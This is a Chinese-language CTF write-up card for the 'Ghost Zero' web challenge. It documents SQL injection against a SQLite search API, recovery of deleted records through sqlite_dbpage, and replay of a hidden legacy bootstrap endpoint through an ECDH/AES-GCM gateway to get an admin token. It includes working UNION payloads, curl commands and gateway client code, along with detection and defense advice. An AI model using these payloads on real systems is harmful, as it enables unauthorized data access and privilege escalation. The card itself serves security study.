---
id: ctf-web-sqli-sqlite-dbpage-deleted-pcap-ecdh-gateway-bootstrap
title: SQLi 挖 sqlite_dbpage 删除记录 + ECDH/AES-GCM 网关重放命中隐藏 legacy bootstrap 接口
type: scenario
domain: ctf
path: ctf/web
technique: sqli-sqlite-dbpage-ecdh-gateway-hidden-endpoint
aliases:
- Ghost Zero
- sqlite_dbpage 读删除页
- 删除 pcap 恢复
- ECDH P-256 网关
- HKDF AES-GCM
- 隐藏 bootstrap 接口
- exchangeTicket
tags:
- ctf
- web
- sqli
- sqlite
- sqlite-dbpage
- deleted-record
- pcap
- ecdh
- hkdf
- aes-gcm
- gateway
- jwt
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:47:58+08:00'
  notes: 已对照原文核对：UNION 注入读到 knowledge_base/logs??/User/q_8f3c1a72d90e4b65、r4 字段、四份 pcap 元数据、sqlite_dbpage pgno=5 的 deleted 记录与 SHA256、tshark 提取 /ddddddtestStat 与 /api/auth/exchange、P-256 ECDH + HKDF-SHA256 ghost-packet:c2s/s2c + AES-256-GCM 稳定序列化/AAD、隐藏 target 取 exchangeTicket 换 admin token 读 /api/flag 均一致。未验证点：原文用 node ghost_zero_client.js 调搜索接口，卡内 PoC 的 $BASE/api/search 路径为按题面重建，未在原文直接给出；PoC 未复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

Ghost Zero 的搜索框存在 SQL 注入，先用 `UNION SELECT` 枚举 `sqlite_master`，发现隐藏表 `q_...` 存着四份 pcap 元数据；再用 `sqlite_dbpage` 直接读第 5 页原始数据，从已删除的 JSON 记录里恢复一份被删抓包的下载路径。抓包里是旧版引导接口 `/ddddddtestStat`（返回 `exchangeTicket`）和 `/api/auth/exchange`（换管理员 token）。当前实例已把接口藏到加密网关 `/api/gateway` 后面；复现前端 ECDH P-256 + HKDF-SHA256 + AES-GCM 流程，把隐藏 target `/ddddddtestStat` 送进网关，拿到 ticket 换 admin token，再读 `/api/flag`。

## 原理

- **SQL 注入**：搜索参数直接拼进 SQLite 查询，返回 JSON 的 `id/title/summary` 三列；用 `' UNION SELECT 1,group_concat(name),3 FROM sqlite_master --` 枚举表名，得到 `knowledge_base`、`logs??`、`User`、`q_8f3c1a72d90e4b65`；再读 `sqlite_master.sql` 得到隐藏表字段 `r4`。
- **隐藏表元数据**：`q_...` 的 `r4` 是 JSON，包含四份 pcap 的 `storagePath`、`downloadPath`、`bytes`、`sha256`；正常抓包只有公开接口和两段 ECDH+AES-GCM 通信，无法直接恢复明文。
- **sqlite_dbpage**：SQLite 的 `sqlite_dbpage` 虚拟表允许按页读取数据库原始页；查询 `SELECT quote(data) FROM sqlite_dbpage WHERE pgno=5` 可在页数据中看到一条 `deleted:true` 的 JSON 记录，里面还有第五份抓包的路径与哈希。下载后 SHA256 与记录一致。
- **旧版授权链**：被删抓包用 `tshark` 提取 HTTP 明文，看到 `POST /ddddddtestStat` 返回 `exchangeTicket`、`POST /api/auth/exchange` 用 ticket 换 admin token；这条链说明不需要破解当前 ECDH/RSA，而是找旧版引导接口。
- **加密网关**：当前前端流程为：`POST /api/session/guest` 取 guest token；`POST /api/transport/bootstrap` 提交浏览器生成的 P-256 公钥，服务端返回公钥、`salt`、`sid`；双方 ECDH 得到共享秘密，用 HKDF-SHA256（salt + info `ghost-packet:c2s`/`s2c`）派生两把 AES-256-GCM 密钥；请求体按稳定序列化规则加密 `{target, body}`，AAD 为 `{direction,seq,sid,ts,v}` 的稳定序列化，发往 `/api/gateway`。
- **隐藏 target**：把 `target` 设为 `/ddddddtestStat`，body 为 `{"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}`，网关解密后转发到内部路由，返回 `exchangeTicket`；再用 `/api/auth/exchange` 换 admin token，访问 `/api/flag`。

## 触发条件

- 搜索/查询接口存在 SQL 注入，且返回列数、错误/回显可观测。
- SQLite 未禁用 `sqlite_dbpage` 虚拟表，数据库页中仍残留已删除记录。
- 残留记录指向可下载的抓包/备份文件，文件内包含旧版接口或凭据。
- 当前网关使用可复现的 ECDH + KDF + AEAD 流程，且不限制隐藏 target（或 target 白名单可被内部路由绕过）。
- 旧版 bootstrap 接口未彻底下线，仍可通过内部路由访问。

## 利用步骤

1. 确认搜索注入点与列数；UNION 枚举 `sqlite_master` 表名与建表 SQL，找隐藏表。
2. 读取隐藏表元数据，记录 pcap 路径与哈希；尝试下载正常抓包，确认无法直接解密。
3. 查询 `sqlite_dbpage` 第 5 页（及其他页），在十六进制页数据中搜索 `deleted:true`、`storagePath`、`pcap`，恢复删除记录。
4. 下载删除抓包，校验 SHA256；用 tshark 提取 HTTP 请求/响应，记录旧版 `/ddddddtestStat` 与 `/api/auth/exchange` 的字段。
5. 复现前端 ECDH/HKDF/AES-GCM：guest token -> bootstrap -> derive c2s/s2c -> 稳定序列化 + AAD 加密 -> `/api/gateway`。
6. 发送隐藏 target `/ddddddtestStat`，取 `exchangeTicket`；调用 `/api/auth/exchange` 换 admin token；带 token 请求 `/api/flag`。

## PoC

SQLi 枚举与页读取：

```bash
# 表名
curl -s "$BASE/api/search?q=' UNION SELECT 1,group_concat(name),3 FROM sqlite_master --"
# 建表 SQL（隐藏表字段）
curl -s "$BASE/api/search?q=' UNION SELECT 1,group_concat(sql,'||'),3 FROM sqlite_master --"
# 第 5 页原始数据，搜索 deleted/storagePath
curl -s "$BASE/api/search?q=' UNION SELECT 1,quote(data),3 FROM sqlite_dbpage WHERE pgno=5 --"
```

网关复现（Node.js 核心）：

```javascript
function stableStringify(v) {
  if (v === null || typeof v !== "object") return JSON.stringify(v);
  if (Array.isArray(v)) return `[${v.map(stableStringify).join(",")}]`;
  return `{${Object.keys(v).sort().filter(k => v[k] !== undefined)
    .map(k => `${JSON.stringify(k)}:${stableStringify(v[k])}`).join(",")}}`;
}

async function derive(secret, salt, info, usages) {
  const km = await crypto.webcrypto.subtle.importKey("raw", secret, "HKDF", false, ["deriveKey"]);
  return crypto.webcrypto.subtle.deriveKey(
    { name: "HKDF", hash: "SHA-256", salt, info: encoder.encode(info) },
    km, { name: "AES-GCM", length: 256 }, false, usages);
}

// guest token -> ECDH P-256 -> bootstrap -> shared bits
// enc = derive(shared, salt, "ghost-packet:c2s", ["encrypt"])
// dec = derive(shared, salt, "ghost-packet:s2c", ["decrypt"])
// AAD = stableStringify({direction:"c2s",seq,sid,ts,v:1})
// pt  = stableStringify({target:"/ddddddtestStat", body:{...}})
```

拿到 ticket 后：

```bash
curl -s -X POST "$BASE/api/auth/exchange" -H 'Content-Type: application/json' \
  -d '{"ticket":"<exchangeTicket>","grantType":"legacy-bootstrap"}'
curl -s "$BASE/api/flag" -H "Authorization: Bearer <adminToken>"
```

## 变体与关联

- `sqlite_dbpage` 可换成 `sqlite_master` 残留、WAL/SHM 文件、备份/日志、未 `VACUUM` 的删除页；核心是“数据库页级恢复已删除记录”。
- 加密网关可换成 RSA/AES、Noise、自定义握手；先复现前端流程，再替换 target/body。
- 隐藏接口可换成旧版 API、内部管理路由、gRPC/GraphQL 字段；通过抓包/JS/备份发现。
- 关联：SQLite 注入与页级取证、ECDH/HKDF/AEAD 网关、JWT 交换、隐藏接口卡。

## 检测与防御

- 搜索/查询全部参数化；禁用 `sqlite_dbpage`/`ATTACH`/`load_extension`，数据库账号最小权限；对敏感数据使用 `VACUUM`/安全删除。
- 旧版 bootstrap/交换接口彻底下线，不要只在前端隐藏；网关 target 使用严格白名单，内部路由做独立鉴权。
- 加密网关的 KDF/AAD 绑定用户与会话，禁止跨会话重放；ticket 一次性、短有效期、绑定来源。
- 检测：SQL 中出现 `sqlite_master`/`sqlite_dbpage`/`UNION SELECT`；异常访问旧版 `/ddddddtestStat`；同一 guest 会话突然交换 admin token；`/api/flag` 非管理员访问。
